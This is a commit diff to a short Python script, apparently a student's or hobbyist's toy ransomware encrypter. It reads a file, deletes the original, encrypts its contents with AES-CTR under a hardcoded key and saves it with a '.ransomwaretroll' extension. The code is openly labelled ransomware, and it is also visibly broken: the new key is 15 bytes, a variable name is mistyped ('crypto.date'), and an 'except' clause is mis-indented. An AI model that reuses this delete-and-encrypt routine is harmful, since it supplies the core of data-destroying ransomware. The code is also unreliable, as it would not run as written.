encrypter melhorado

+++ encrypter.py
@@ -1,24 +1,29 @@
-import os
+import os 
 import pyaes
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+def criptografar():
+  try:
+    file_name = "teste.txt"
+    key = b"testeransomware"
+    
+    if not os.path.exists(file_name):
+      print(f" -- erro: O arquivo {file_name} não existe.")
+      return
+      
+    with open(file_name, "rb") as file:
+      file_data = file.read()
 
-## remover o arquivo
-os.remove(file_name)
+    os.remove(file_name)
+    
+    aes = pyaes.AESModeOfOperationCTR(key)
+    crypto.date = aes.encrypt(file_data)
+    
+    new_file_name = file_name + ".ransomwaretroll"
+    with open(new_file_name, "wb") as new_file:
+      new_file.write(crypto_data)
+      print(f" -- Arquivo '{file_name}' criptografado com sucesso para '{new_file_name}'")
+      except Exception as e:
+        print(f"[-] Erro na criptografia: {e}")
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
-
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+if __name__ == "__main__":
+    criptografar()
